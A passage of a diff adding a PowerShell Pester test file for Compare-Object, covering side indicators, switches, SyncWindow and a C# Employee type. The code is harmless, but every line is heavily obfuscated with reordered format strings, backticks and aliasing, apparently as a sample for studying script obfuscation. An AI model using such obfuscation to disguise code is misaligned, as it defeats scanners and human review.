@@ -1,0 +1,461 @@
+Set  ('7aI'+'X')  ( [typE]("{2}{1}{0}" -F'enT','nm','EnvIRo')  ) ;$bqg3h9 =  [tYPE]("{0}{2}{3}{1}" -f'eMPloyeEC','blE','OmPAR','A')  ;  
+
+&("{1}{0}{2}"-f'scrib','De','e') ("{2}{4}{3}{0}{1}"-f 'e','ct','Com','-Obj','pare') -Tags "CI" {
+	&("{2}{0}{3}{1}" -f'e','oreAll','B','f') {
+		${N`l} =   ( gcI ('VAri'+'AbLE:'+'7AIx')  ).valuE::"n`EWLi`Ne"
+
+		${con`TE`Nt1} = ("{0}{1}"-f'lin','e 1') + ${nl} + ("{1}{2}{0}"-f'2','l','ine ')
+		${CO`NT`eNt2} = ("{1}{2}{0}"-f' 1','lin','e') + ${NL} + ("{1}{2}{0}" -f '.1','li','ne 2')
+		${CO`N`Tent3} = ("{1}{2}{0}"-f'ne 1','l','i') + ${nl} + ("{1}{0}"-f'e 2','lin') + ${n`l} + ("{0}{1}" -f 'line ','3')
+		${c`o`NTENT4} = ("{2}{1}{0}" -f' 1','ne','li') + ${n`L} + ("{2}{1}{0}"-f '1','ine 2.','l') + ${n`L} + ("{1}{2}{0}"-f' 3','Li','ne')
+
+		${f`I`lE1} = &("{0}{1}{2}" -f'Jo','in','-Path') -Path ${TE`STDrI`Ve} -ChildPath ("{2}{1}{0}" -f 'xt','est1.t','t')
+		${F`iLe2} = &("{1}{2}{3}{0}"-f'th','J','oin-','Pa') -Path ${tes`TdR`IVe} -ChildPath ("{2}{1}{0}"-f't2.txt','es','t')
+		${fi`lE3} = &("{1}{2}{0}"-f'n-Path','J','oi') -Path ${tE`STdrI`VE} -ChildPath ("{2}{1}{0}"-f 'xt','3.t','test')
+		${f`il`E4} = &("{1}{0}{2}"-f 'n-Pat','Joi','h') -Path ${t`EstD`RivE} -ChildPath ("{0}{1}{2}"-f 't','e','st4.txt')
+
+		${n`Ull} = &("{2}{0}{1}" -f 'ew-Ite','m','N') ${F`Ile1} -ItemType ("{1}{0}" -f 'le','fi') -Value ${cO`N`TENT1} -Force
+		${nu`lL} = &("{2}{0}{1}"-f'-Ite','m','New') ${fI`LE2} -ItemType ("{0}{1}" -f'fi','le') -Value ${cOnT`E`NT2} -Force
+		${n`ULL} = &("{0}{2}{1}"-f'New-','em','It') ${FIL`E3} -ItemType ("{1}{0}"-f 'e','fil') -Value ${Co`N`TENT3} -Force
+		${nU`ll} = &("{1}{0}{2}"-f 'w-Ite','Ne','m') ${f`iLE4} -ItemType ("{1}{0}" -f'ile','f') -Value ${c`O`NT`eNT4} -Force
+	}
+
+    &('It') ("{1}{20}{23}{18}{24}{25}{19}{14}{9}{21}{11}{26}{6}{4}{3}{16}{7}{2}{12}{13}{22}{15}{17}{8}{5}{0}{10}" -f'ct ','Should be ','f','sin',' u','je','ect','the re','ceOb','the ','switches','e ob','er','enceO','re ','iff','g ','eren','o c','a','abl','sam','bject and d','e t','om','p','j') {
+	{ &("{0}{1}{2}{3}"-f 'Co','mp','are-','Object') -ReferenceObject $(&("{1}{0}{2}"-f '-Co','Get','ntent') ${FI`LE1}) -DifferenceObject $(&("{1}{0}{2}"-f 'onten','Get-C','t') ${fi`Le2}) } | &("{1}{0}"-f'ld','Shou') -Not -Throw
+    }
+
+    &('It') ("{15}{5}{14}{1}{7}{4}{10}{13}{6}{11}{9}{12}{3}{0}{2}{8}"-f' is ','ot ','not use','h','ow w','ou','ob','thr','d','ect s','hen ref','j','witc','erence','ld n','Sh') {
+	{ &("{1}{0}{2}{3}{4}"-f'mpare-O','Co','b','j','ect') $(&("{0}{1}{2}"-f'Get-','Conten','t') ${Fi`Le1}) -DifferenceObject $(&("{2}{0}{1}" -f't','ent','Get-Con') ${F`iLe2}) } | &("{1}{0}" -f 'ld','Shou') -Not -Throw
+    }
+
+    &('It') ("{7}{8}{1}{9}{3}{4}{5}{6}{2}{0}" -f 'ed','n diffe','tch is not us','j','e','ct sw','i','Should not t','hrow whe','renceob') {
+	{ &("{0}{3}{1}{2}"-f'Com','re','-Object','pa') -ReferenceObject $(&("{0}{1}{2}" -f 'Get','-','Content') ${f`I`LE1}) $(&("{2}{1}{0}"-f'ontent','et-C','G') ${fI`L`e2}) } | &("{1}{0}" -f'ould','Sh') -Not -Throw
+    }
+
+    &('It') ("{7}{5}{2}{8}{10}{11}{0}{3}{9}{4}{6}{1}" -f 'ex','nce dataset','cate da','i',' in','indi',' the refere','Should ','ta th','sts only','at',' ') {
+	${A`Ct`UALO`UTpuT} = &("{3}{0}{1}{2}" -f'pare','-Objec','t','Com') -ReferenceObject $(&("{3}{0}{1}{2}" -f '-C','ont','ent','Get') ${FI`LE3}) -DifferenceObject $(&("{1}{2}{0}" -f 'tent','G','et-Con') ${FI`lE4})
+
+	${actuA`LoU`T`PuT}[1]."S`iDEin`dicaTor" | &("{0}{1}"-f'Sho','uld') -BeExactly "<="
+    }
+
+    &('It') ("{10}{6}{13}{2}{9}{8}{0}{3}{11}{7}{12}{1}{5}{4}"-f 't exis','diff','ate d','ts ','et','erence datas','in','t','tha','ata ','Should ','only in ','he ','dic') {
+	${ac`TuAloU`TPut} = &("{0}{1}{2}" -f 'Co','mpare-Obj','ect') -ReferenceObject $(&("{1}{0}{3}{2}" -f '-Con','Get','nt','te') ${fil`e3}) -DifferenceObject $(&("{1}{0}{2}"-f 'et-Conten','G','t') ${F`IL`E4})
+
+	${aC`TualoU`T`pUT}[1]."SiDe`Ind`iC`AtoR" | &("{2}{1}{0}" -f'ld','hou','S') -BeExactly "<="
+    }
+
+    &('It') ("{21}{25}{23}{18}{3}{14}{5}{17}{10}{15}{2}{0}{24}{19}{22}{4}{12}{7}{1}{6}{20}{11}{13}{9}{16}{8}"-f 'ists in','q','ex','e ','atasets when the ','ata t','ua','cludeE',' used','ch i','t','i','in','t','d',' ','s','ha','at',' ','l sw','S','d','uld indic',' both','ho') {
+	${ACt`Ual`OUT`PuT} = &("{0}{4}{1}{2}{3}" -f 'Co','bj','e','ct','mpare-O') -ReferenceObject $(&("{3}{0}{1}{2}"-f 'on','t','ent','Get-C') ${FIL`e3}) -DifferenceObject $(&("{2}{0}{1}"-f '-Conten','t','Get') ${F`I`le4}) -IncludeEqual
+
+	${aCT`UALo`Ut`PUt}."l`E`Ngth"           | &("{0}{2}{1}" -f 'S','ld','hou') -Be 4
+	${ac`Tu`ALO`UTp`UT}[0]."S`iDEI`Nd`ica`TOR" | &("{0}{1}"-f 'Shou','ld') -BeExactly "=="
+	${AC`TUaloUtp`Ut}[1]."SI`DE`IN`DicA`TOr" | &("{2}{0}{1}" -f'ho','uld','S') -BeExactly "=="
+    }
+
+    &('It') ("{7}{4}{11}{3}{12}{6}{0}{9}{2}{8}{10}{1}{5}" -f ' th','esensiti',' ','ld','ho','ve switch','le to use','S','ca','e','s','u',' be ab') {
+	{ &("{1}{3}{2}{0}"-f 'ct','Compa','e-Obje','r') -ReferenceObject $(&("{1}{2}{0}" -f 't','Get-Cont','en') ${fIL`e3}) -DifferenceObject $(&("{2}{1}{0}"-f 'ent','Cont','Get-') ${fi`Le4}) -CaseSensitive } | &("{0}{2}{1}" -f'Sh','uld','o') -Not -Throw
+    }
+
+    &('It') ("{20}{12}{6}{9}{11}{2}{21}{22}{15}{19}{8}{0}{10}{7}{18}{24}{1}{4}{14}{16}{17}{13}{5}{3}{23}" -f'ases are',' th','y i','u','e case','is ','d correc','diff','nt c','t',' ','l','houl','witch ','sensit','cat','ive ','s','erent ','e that differe','S','n','di','sed','when') {
+	${caO`UT`P`Ut}  = &("{4}{0}{2}{1}{3}"-f 'm','c','pare-Obje','t','Co') -ReferenceObject $(&("{2}{1}{3}{0}"-f't','et-C','G','onten') ${F`IL`e3}) -DifferenceObject $(&("{1}{2}{3}{0}" -f'nt','Get-','Co','nte') ${FIl`E4}) -CaseSensitive
+	${N`c`Ao`UTPUT} = &("{0}{2}{1}{3}"-f 'Com','e-O','par','bject') -ReferenceObject $(&("{1}{0}{2}"-f't-Conte','Ge','nt') ${F`iLe3}) -DifferenceObject $(&("{0}{2}{1}"-f'Get-','ntent','Co') ${F`I`LE4})
+
+	${CA`O`UtpuT}."l`eng`Th" | &("{1}{0}{2}" -f 'h','S','ould') -Be 4
+
+	${ncAO`UtP`UT}[1]."sIDei`Ndic`ATOr" | &("{1}{0}"-f'd','Shoul') -Not -Be ${c`AOutp`UT}[1]."s`IDeiN`dIc`ATor"
+	${NCAo`U`T`Put}[2]."sid`ei`NDiC`A`TOr" | &("{1}{0}"-f'ould','Sh') -Not -Be ${CaoU`TPut}[2]."siD`eiNdI`C`AT`or"
+	${N`cA`oU`TPUT}[3]."Si`d`EInDicAtOr" | &("{0}{1}" -f'Sho','uld') -Not -Be ${C`A`OutpuT}[3]."s`IdEiN`D`ICA`TOR"
+
+    }
+
+    &('It') ("{2}{1}{4}{6}{5}{7}{0}{3}{8}"-f 'set','row when','Should th',' i',' referen','e','c',' ','s null') {
+	{ &("{3}{1}{2}{0}"-f'bject','are-','O','Comp') -ReferenceObject ${AnoNExISTENtV`ArIa`B`lE} -DifferenceObject $(&("{2}{0}{1}"-f 'nte','nt','Get-Co') ${fi`l`e4}) } | &("{1}{0}"-f'hould','S') -Throw
+    }
+
+    &('It') ("{1}{3}{2}{8}{4}{7}{0}{5}{6}" -f'f','S','ld thro','hou',' when ','erence set is',' null','dif','w') {
+	{ &("{0}{2}{4}{3}{1}" -f 'Com','ect','par','j','e-Ob') -ReferenceObject $(&("{2}{1}{0}" -f 'ntent','o','Get-C') ${F`IL`e3}) -DifferenceObject ${aN`o`NeXIs`TenT`VARIA`BLe} } | &("{1}{0}"-f'ld','Shou') -Throw
+    }
+
+    &('It') ("{13}{8}{11}{1}{15}{9}{10}{0}{7}{14}{2}{5}{3}{6}{4}{12}"-f'wit',' 0 array when us',' t','ua','wit','he includeeq','l s','hout also','ive','ferent ','switch ',' a','ch','Should g',' using','ing excludedif') {
+	${AcTuALo`UTP`UT} = &("{2}{1}{0}"-f'ject','re-Ob','Compa') -ReferenceObject $(&("{1}{0}{2}" -f'et-Cont','G','ent') ${f`IL`E3}) -DifferenceObject $(&("{2}{3}{1}{0}"-f't','-Conten','G','et') ${F`Il`e4}) -ExcludeDifferent
+
+	${A`cT`UaL`Output}."len`GtH" | &("{1}{0}"-f'ld','Shou') -Be 0
+    }
+
+    &('It') ("{10}{11}{16}{12}{5}{14}{4}{6}{18}{17}{21}{22}{1}{13}{2}{20}{9}{7}{3}{19}{15}{8}{0}" -f'h',' ','ed a','eequal ','hen exc','es ','l','includ','tc','ide the ','Should only display',' ','lin','us','w','i','equal ','eDiff','ud','sw','longs','er','ent switch is') {
+	${a`cTualoU`Tp`Ut} = &("{0}{1}{3}{4}{2}" -f'Co','mpa','ject','re','-Ob') -ReferenceObject $(&("{1}{2}{3}{0}"-f'ent','Get','-Con','t') ${FIl`E3}) -DifferenceObject $(&("{1}{0}{3}{2}"-f 'nt','Get-Co','nt','e') ${F`ile4}) -IncludeEqual -ExcludeDifferent
+
+	${acT`UalO`UTP`Ut}."L`enG`Th" | &("{1}{0}"-f'ould','Sh') -Be 2
+    }
+
+    &('It') ("{11}{14}{1}{16}{2}{15}{5}{10}{6}{4}{9}{0}{12}{3}{7}{13}{8}"-f'line ','e ab',' pass o','g the','o pip','c','s t',' passth','witch','e','t','Shou','usin','ru s','ld b','bje','le to') {
+	{ &("{3}{0}{1}{2}"-f 'pare-Obj','e','ct','Com') -ReferenceObject $(&("{2}{0}{1}"-f 'e','nt','Get-Cont') ${Fi`l`e3}) -DifferenceObject $(&("{3}{0}{2}{1}"-f'o','tent','n','Get-C') ${fI`Le4}) -Passthru | &("{1}{0}{2}" -f'mat-Wid','For','e') } | &("{1}{0}"-f'hould','S') -Not -Throw
+    }
+
+    &('It') ("{7}{2}{11}{12}{6}{4}{9}{3}{0}{8}{10}{1}{5}"-f'the property','mp','u','ify ','le to ','are','b','Sho',' of two objects t','spec','o co','ld b','e a') {
+	${Ac`TU`ALOuT`PUt} = &("{2}{0}{1}" -f 'e-Obje','ct','Compar') -ReferenceObject ${f`I`Le3} -DifferenceObject ${TE`std`RIVE} -Property ("{0}{1}{2}"-f'Le','n','gth')
+	${a`cT`UaLo`UtPuT}[0]."LE`Ngth" | &("{1}{2}{0}" -f'ld','Sh','ou') -BeNullOrEmpty
+	${a`ctUalo`U`TpuT}[1]."L`enGTH" | &("{0}{1}" -f'Shou','ld') -BeGreaterThan 0
+	${ac`TUAlOuTP`Ut}[0]."len`g`Th" | &("{0}{1}" -f 'Shoul','d') -Not -Be ${AcTu`ALoU`T`PUt}[1]."le`NG`Th"
+    }
+
+    &('It') ("{1}{9}{6}{11}{7}{5}{8}{0}{12}{3}{4}{10}{2}"-f 'i','Should be ab','out error','ow',' w','he sync','e to ','ecify t','w','l','ith','sp','nd') {
+	{ &("{2}{1}{0}{3}" -f '-Ob','pare','Com','ject') -ReferenceObject $(&("{0}{2}{1}"-f 'Get-Cont','nt','e') ${fi`l`E3}) -DifferenceObject $(&("{2}{0}{1}" -f 'C','ontent','Get-') ${f`ile4}) -syncWindow 5 } | &("{0}{1}"-f 'Sh','ould') -Not -Throw
+	{ &("{0}{2}{4}{3}{1}" -f'Com','bject','p','re-O','a') -ReferenceObject $(&("{3}{0}{1}{2}" -f'-C','ont','ent','Get') ${fi`LE3}) -DifferenceObject $(&("{0}{2}{3}{1}"-f 'G','t','et-Con','ten') ${Fi`l`E4}) -syncWindow 8 } | &("{0}{1}" -f'S','hould') -Not -Throw
+    }
+
+    &('It') ("{10}{7}{13}{4}{1}{0}{12}{3}{11}{14}{2}{8}{6}{9}{5}"-f' ','d','g',' wh','pecte','window','g ','ld','in','the sync','Shou','en c','output',' have the ex','han') {
+	${VA`R1} = 1..15
+	${v`Ar2} = 15..1
+
+	${ActuAL`o`UT`p`Ut} = &("{2}{3}{1}{0}" -f 'ject','-Ob','Compar','e') -ReferenceObject ${va`R1} -DifferenceObject ${VA`R2} -syncWindow 6
+
+	${acTUALo`U`TPUT}[0]."inp`U`T`oBJeCT" | &("{2}{0}{1}"-f 'oul','d','Sh') -Be 15
+	${ActUalo`U`TPut}[1]."inPUT`Ob`J`eCt" | &("{0}{1}{2}" -f 'Sh','ou','ld') -Be 1
+	${ACtuA`L`OUTPUt}[2]."i`NpuToBj`Ect" | &("{2}{1}{0}"-f 'uld','ho','S') -Be 1
+	${Ac`TU`AL`o`UTPuT}[3]."inpU`T`O`BJeCt" | &("{2}{0}{1}" -f 'o','uld','Sh') -Be 15
+
+	${ac`TUalo`U`TpUT}[0]."S`IDe`i`N`DIcaTor" | &("{1}{0}" -f 'hould','S') -BeExactly "=>"
+	${ACTual`ouTP`UT}[1]."sI`d`eiNdICaToR" | &("{1}{0}"-f 'ld','Shou') -BeExactly "<="
+	${act`UaL`Out`put}[2]."S`IdEINDIcA`ToR" | &("{1}{0}" -f 'uld','Sho') -BeExactly "=>"
+	${act`Ua`LoU`TpuT}[3]."SIdeiN`DIca`T`or" | &("{2}{0}{1}" -f 'l','d','Shou') -BeExactly "<="
+    }
+}
+
+&("{0}{2}{1}" -f 'De','e','scrib') ("{2}{1}{5}{7}{3}{4}{6}{8}{0}" -f'y','-Obj','Compare','sic ','fu','ec','nc','t DRT ba','tionalit') -Tags "CI" {
+		if(-not ([System.Management.Automation.PSTypeName]("{0}{2}{1}" -f 'Em','yee','plo'))."T`YpE")
+		{
+			&("{2}{0}{1}"-f'd-','Type','Ad') -TypeDefinition @"
+    public class Employee
+    {
+        public Employee(){}
+        public Employee(string firstName, string lastName, int yearsInMS)
+        {
+            FirstName = firstName;
+            LastName  = lastName;
+            YearsInMS = yearsInMS;
+        }
+        public string FirstName;
+        public string LastName;
+        public int YearsInMS;
+    }
+    public class EmployeeComparable : Employee, System.IComparable
+    {
+        public EmployeeComparable(
+            string firstName, string lastName, int yearsInMS)
+            : base(firstName, lastName, yearsInMS)
+        {}
+
+        public int CompareTo(object obj)
+        {
+            EmployeeComparable ec = obj as EmployeeComparable;
+            if (null == ec)
+                return -1;
+            if (FirstName != ec.FirstName)
+                return -1;
+            if (LastName != ec.LastName)
+                return -1;
+            if (YearsInMS != ec.YearsInMS)
+                return -1;
+            return 0;
+        }
+    }
+
+    public class EmployeeDefinesSideIndicator : EmployeeComparable
+    {
+        public EmployeeDefinesSideIndicator(
+            string firstName, string lastName, int yearsInMS)
+            : base(firstName, lastName, yearsInMS)
+        {}
+
+        public string SideIndicator
+        {
+            get { throw new System.ArgumentException("get_SideIndicator"); }
+            set { throw new System.ArgumentException("get_SideIndicator"); }
+        }
+    }
+"@
+		}
+		else
+		{
+			&("{2}{0}{1}" -f '-T','ype','Add') -TypeDefinition @"
+    public class EmployeeComparable : Employee, System.IComparable
+    {
+        public EmployeeComparable(
+            string firstName, string lastName, int yearsInMS)
+            : base(firstName, lastName, yearsInMS)
+        {}
+
+        public int CompareTo(object obj)
+        {
+            EmployeeComparable ec = obj as EmployeeComparable;
+            if (null == ec)
+                return -1;
+            if (FirstName != ec.FirstName)
+                return -1;
+            if (LastName != ec.LastName)
+                return -1;
+            if (YearsInMS != ec.YearsInMS)
+                return -1;
+            return 0;
+        }
+    }
+
+    public class EmployeeDefinesSideIndicator : EmployeeComparable
+    {
+        public EmployeeDefinesSideIndicator(
+            string firstName, string lastName, int yearsInMS)
+            : base(firstName, lastName, yearsInMS)
+        {}
+
+        public string SideIndicator
+        {
+            get { throw new System.ArgumentException("get_SideIndicator"); }
+            set { throw new System.ArgumentException("get_SideIndicator"); }
+        }
+    }
+"@
+	}
+	&('It') ("{0}{2}{9}{6}{3}{1}{7}{8}{12}{5}{11}{4}{10}"-f'Compare-Obj','ref','ect wit',' ','erenceObject shou','and 1 di',' 1','e','renceOb','h','ld work','ff','ject '){
+		${E`mpSr`e`FERENcE} = @(  $BQG3H9::("{1}{0}" -f 'ew','N').Invoke(("{1}{0}"-f 'hn','jo'),("{1}{0}"-f'h','smit'),5))
+		${EMP`SDI`F`FErE`NCe} = @( ( varIabLE  BQG3h9  ).VAlUE::("{1}{0}"-f'ew','N').Invoke(("{0}{1}"-f'ma','ry'),("{1}{0}" -f'ane','j'),5))
+		${BOO`LvAl`UeS}=@(${T`Rue},${f`A`lse})
+		foreach(${RECOrDE`q`Ual} in ${B`oOLv`AL`UEs})
+		{
+			foreach(${E`xcLu`Dedi`FFEREnt} in ${Bo`OL`VALUes})
+			{
+				foreach(${pAS`St`Hru} in ${Boo`LV`ALu`eS})
+				{
+					${RE`s`ULT} = &("{0}{4}{1}{2}{3}" -f 'C','-','Obj','ect','ompare') -ReferenceObject ${e`MpSREfe`RE`Nce} -IncludeEqual:${rE`c`ORdeQu`AL} -ExcludeDifferent:${EXcl`Ude`DiFfe`RENt} -Passthru:${P`AS`STh`Ru} -DifferenceObject ${e`MpSdiF`F`ErEnCe}
+
+					if(!${eXcLUde`DiF`Fe`R`E`Nt})
+					{
+						${R`Es`UlT}."CO`UNT" | &("{0}{1}{2}"-f'S','hou','ld') -Be 2
+						if(${PaSSth`RU})
+						{
+							${r`e`sULt}[0] | &("{1}{0}"-f 'uld','Sho') -Be ${e`MPsD`iF`FerENcE}
+							${R`ESUlT}[1] | &("{0}{1}" -f'Shoul','d') -Be ${EMpS`REferE`N`Ce}
+						}
+						else
+						{
+							${rESU`lt}[0]."iNputO`B`j`Ect" | &("{1}{0}{2}"-f'ou','Sh','ld') -Be ${E`Mp`SDiFFe`RE`NCE}
+							${r`ESUlt}[1]."INputobj`e`cT" | &("{1}{2}{0}" -f 'ld','Sh','ou') -Be ${E`Mp`SREF`eRENCE}
+							${r`EsulT}[0]."SIDeindI`Ca`T`OR" | &("{1}{0}"-f 'ld','Shou') -BeExactly "=>"
+							${RE`SUlT}[1]."sI`DeI`NDIca`Tor" | &("{1}{0}"-f'd','Shoul') -BeExactly "<="
+						}
+					}
+					else
+					{
+						${RE`SULT}."cOu`NT" | &("{0}{1}"-f'Shou','ld') -Be 0
+					}
+				}
+			}
+		}
+	}
+
+	&('It') ("{13}{11}{0}{1}{10}{4}{12}{8}{2}{6}{7}{5}{3}{9}" -f'-Object with 2 referenceObject','s','re','ect sh','1 ','j','nceO','b','e','ould work',' and ','pare','diff','Com'){
+		${EmPsr`eFE`Re`NCe} = @( (  GI VariAbLe:bqg3H9).value::("{0}{1}" -f 'Ne','w').Invoke(("{0}{1}"-f 'joh','n'),("{0}{1}" -f'smit','h'),5),  (  GCI  ("V"+"ARIa"+"BlE:bqg3H9")).VaLUE::("{1}{0}"-f'ew','N').Invoke(("{1}{0}"-f'ary','m'),("{0}{1}"-f 'j','ane'),3))
+		${Em`PSdifFer`EnCe} = @(  (  cHILdiTem vARiabLE:Bqg3H9).vAlue::("{1}{0}" -f'w','Ne').Invoke(("{1}{0}"-f 'n','joh'),("{1}{0}" -f 'th','smi'),5))
+		${b`OOl`Val`UES}=@(${T`RUE},${F`A`LsE})
+		foreach(${ReCO`RD`Equal} in ${BO`Olv`A`LUeS})
+		{
+			foreach(${EXCludeDI`F`Fere`Nt} in ${bO`OlvALU`Es})
+			{
+				foreach(${p`ASSTH`RU} in ${BoO`LvAL`U`es})
+				{
+					${rEs`Ult} = &("{2}{0}{1}"-f 'are','-Object','Comp') -ReferenceObject ${Em`PsrEF`eren`ce} -IncludeEqual:${RECO`R`de`QuAl} -ExcludeDifferent:${eXClUdE`DIFFER`E`Nt} -Passthru:${Pa`ss`Th`RU} -DifferenceObject ${E`mp`s`di`FfERENce}
+					if(${rECoR`DeQu`Al})
+					{
+						if(!${eXclu`d`E`dIffeRent})
+						{
+							${ReS`Ult}."c`ount" | &("{1}{0}" -f 'uld','Sho') -Be 2
+							if(${pAsS`T`H`RU})
+							{
+								${R`Es`ULt}[0] | &("{1}{0}"-f'd','Shoul') -Be ${eMPsR`EFere`N`cE}[0]
+								${rES`U`lT}[1] | &("{1}{0}{2}"-f 'o','Sh','uld') -Be ${emPsrE`F`e`RE`NCE}[1]
+							}
+							else
+							{
+								${RES`Ult}[0]."INP`UtOBjE`Ct" | &("{0}{1}" -f'Shou','ld') -Be ${EMpSRE`F`eRenCE}[0]
+								${REs`UlT}[1]."InpuT`ObJ`ecT" | &("{1}{0}"-f 'ould','Sh') -Be ${eMp`sREfere`N`Ce}[1]
+								${re`sUlt}[0]."SiDeI`NdIcat`oR" | &("{1}{0}" -f 'd','Shoul') -BeExactly "=="
+								${R`EsUlt}[1]."SiDei`NDicAT`Or" | &("{2}{1}{0}" -f 'ld','ou','Sh') -BeExactly "<="
+							}
+						}
+						else
+						{
+							if(${pasST`hru})
+							{
+								${re`SULT} | &("{1}{0}" -f 'uld','Sho') -Be ${em`psreFE`REnce}[0]
+							}
+							else
+							{
+								${R`ES`ULt}."INpUtO`B`J`ect" | &("{1}{0}" -f 'd','Shoul') -Be ${E`mpsr`EFerEnCE}[0]
+								${RE`SU`Lt}."SId`EIND`iCAT`Or" | &("{1}{0}" -f 'hould','S') -BeExactly "=="
+							}
+						}
+					}
+					else
+					{
+						if(!${E`x`cLuDedifFeR`ENT})
+						{
+							if(${p`AS`Sth`Ru})
+							{
+								${r`EsuLT} | &("{1}{0}" -f 'ld','Shou') -Be ${Em`p`sre`FER`ENCe}[1]
+							}
+							else
+							{
+								${r`eS`Ult}."in`p`UtobjeCt" | &("{0}{1}" -f 'S','hould') -Be ${eMps`REFeRe`Nce}[1]
+								${re`SUlT}."sIde`IndIca`TOr" | &("{0}{1}" -f'S','hould') -BeExactly "<="
+							}
+						}
+						else
+						{
+							${rEs`UlT}."CO`UNT" | &("{0}{1}"-f 'Sh','ould') -Be 0
+						}
+					}
+				}
+			}
+		}
+	}
+
+	&('It') ("{9}{6}{4}{3}{7}{5}{10}{8}{0}{1}{11}{2}" -f'l','d','work','Object w','e-','Sync','mpar','ith 0 ','u','Co','Window sho',' '){
+		${e`MPsR`EF`erENce} = @( (  geT-varIaBlE  bQg3H9  ).VAlUe::("{0}{1}" -f 'N','ew').Invoke(("{1}{0}" -f 'n','joh'),("{1}{0}"-f 'ith','sm'),5))
+		${e`MpS`DIff`erEnCe} = @(  $bqg3h9::("{1}{0}"-f'w','Ne').Invoke(("{1}{0}"-f'hn','jo'),("{0}{1}" -f 's','mith'),5), $bQG3H9::("{0}{1}" -f 'Ne','w').Invoke(("{1}{0}"-f 'y','mar'),("{0}{1}"-f'ja','ne'),3))
+		${B`Oolval`UEs}=@(${T`RUE},${F`Al`se})
+		foreach(${Rec`oRdE`QuAl} in ${bOOLVa`l`U`ES})
+		{
+			foreach(${E`xCLUdeD`IF`F`eReNt} in ${bo`Ol`VA`LUES})
+			{
+				foreach(${pA`SS`ThrU} in ${BO`olva`lUes})
+				{
+					${Re`S`Ult} = &("{3}{0}{2}{4}{1}"-f 'mpar','ct','e-O','Co','bje') -ReferenceObject ${EmP`sR`ef`ereNcE} -IncludeEqual:${RecO`Rd`e`QuAL} -ExcludeDifferent:${e`xc`lUDED`iffERenT} -Passthru:${p`AsstH`RU} -DifferenceObject ${empsDiF`F`E`ReNCE} -SyncWindow:0
+					if(${RE`c`Or`DeqUaL})
+					{
+						if(!${E`XCLU`dEDiffe`R`ENT})
+						{
+							${re`sult}."cO`UnT" | &("{1}{0}"-f 'ould','Sh') -Be 2
+							if(${p`A`ssthrU})
+							{
+								${R`e`SULT}[0] | &("{0}{1}"-f 'Shou','ld') -Be ${EmPsrefE`R`EnCe}
+								${re`Su`lT}[1] | &("{0}{1}" -f 'S','hould') -Be ${EMPs`dIfFe`REN`CE}[1]
+							}
+							else
+							{
+								${res`U`LT}[0]."iN`PUTOBj`EcT" | &("{1}{0}" -f 'ld','Shou') -Be ${EM`PsR`EfE`Re`NCE}
+								${RE`s`UlT}[1]."I`NPUToBJ`ecT" | &("{0}{1}"-f 'Shou','ld') -Be ${EM`pS`DIF`FE`REnCe}[1]
+								${RES`ULT}[0]."sI`dE`i`NDiCAt`Or" | &("{1}{0}"-f'uld','Sho') -BeExactly "=="
+								${Re`SU`Lt}[1]."s`iD`eiNDIcA`ToR" | &("{0}{2}{1}"-f'Sho','d','ul') -BeExactly "=>"
+							}
+						}
+						else
+						{
+							if(${P`ASstHrU})
+							{
+								${r`e`SUlt} | &("{0}{1}" -f 'Sh','ould') -Be ${E`mps`ReFe`RENce}
+							}
+							else
+							{
+								${R`e`SulT}."I`NP`UTOBJecT" | &("{1}{0}"-f 'hould','S') -Be ${EM`Ps`ReFEReN`CE}
+								${rES`ULT}."sid`ei`NdIcATor" | &("{0}{1}"-f'Sho','uld') -BeExactly "=="
+							}
+						}
+					}
+					else
+					{
+						if(!${E`X`Cl`UD`EDifFerEnt})
+						{
+							if(${PAsS`Th`Ru})
+							{
+								${r`e`SuLt} | &("{0}{1}"-f'S','hould') -Be ${E`MP`sd`ifFErE`NCE}[1]
+							}
+							else
+							{
+								${R`ESU`Lt}."in`PUt`obJECt" | &("{1}{0}"-f 'd','Shoul') -Be ${Emp`SD`IFfe`R`ence}[1]
+								${rEs`U`lT}."SiD`eind`iCATOR" | &("{0}{1}" -f'Sh','ould') -BeExactly "=>"
+							}
+						}
+						else
+						{
+							${r`eS`ULT}."coU`NT" | &("{0}{2}{1}" -f 'Sh','uld','o') -Be 0
+						}
+					}
+				}
+			}
+		}
+	}
+
+	&('It') ("{4}{5}{2}{6}{0}{7}{8}{10}{9}{3}{1}"-f' Sy','rk','re-Object wi','o','C','ompa','th','n','cWin','hould w','dow s'){
+		${eMPsrefE`R`ENCE} = @( (  Ls VArIABLe:BQg3H9  ).vaLuE::("{1}{0}"-f 'w','Ne').Invoke(("{0}{1}" -f 'ma','ry'),("{0}{1}" -f 'jan','e'),3),  (  VARIABLe  bqg3h9  ).vAlUE::("{0}{1}"-f 'Ne','w').Invoke(("{0}{1}"-f'jo','hn'),("{1}{0}" -f 'th','smi'),5), (  GET-vaRIABle BQG3h9  -vAlueonly  )::("{1}{0}"-f'w','Ne').Invoke(("{1}{0}"-f'k','jac'), ("{0}{1}" -f'b','lack'), 15),  ( gCi VARIaBlE:BQg3H9 ).vAluE::("{1}{0}" -f 'w','Ne').Invoke("jim", "bob", 1))
+		${EM`P`sdI`FFerEncE} = @(  $bqg3H9::("{1}{0}" -f 'w','Ne').Invoke(("{0}{1}" -f 'ja','ck'), ("{0}{1}" -f 'blac','k'), 15), (  Gi  vArIable:bQG3H9).vAluE::("{0}{1}"-f'Ne','w').Invoke("jim", "bob", 1),  (  GCI ("varia"+"BLE:Bqg"+"3H9")).ValUE::("{0}{1}"-f'N','ew').Invoke(("{1}{0}" -f 'ry','ma'),("{0}{1}" -f 'j','ane'),3),  $BQg3h9::("{1}{0}" -f'ew','N').Invoke(("{1}{0}"-f 'hn','jo'),("{1}{0}"-f 'h','smit'),5))
+		${B`oOlvaLU`es}=@(${tr`Ue},${fa`lsE})
+		foreach(${RECo`RDEq`UAl} in ${b`OOlV`AlU`eS})
+		{
+			foreach(${EXC`lU`DeDI`FfER`ENt} in ${bOOlV`AL`U`es})
+			{
+				foreach(${PA`sSthru} in ${Bo`ol`Va`LuES})
+				{
+					${ReS`U`LT} = &("{3}{1}{2}{0}{4}" -f'O','pa','re-','Com','bject') -ReferenceObject ${Em`psrEfer`En`cE} -IncludeEqual:${REcOr`DE`QUal} -ExcludeDifferent:${exc`LUDEDIffe`RE`Nt} -Passthru:${p`AS`SthRu} -DifferenceObject ${EmPSDif`FEreN`Ce} -SyncWindow:2
+
+					if(${rEc`Or`d`EQUAl})
+					{
+						${R`esuLT}."CO`Unt" | &("{0}{1}"-f 'S','hould') -Be 4
+						if(${pas`SthRu})
+						{
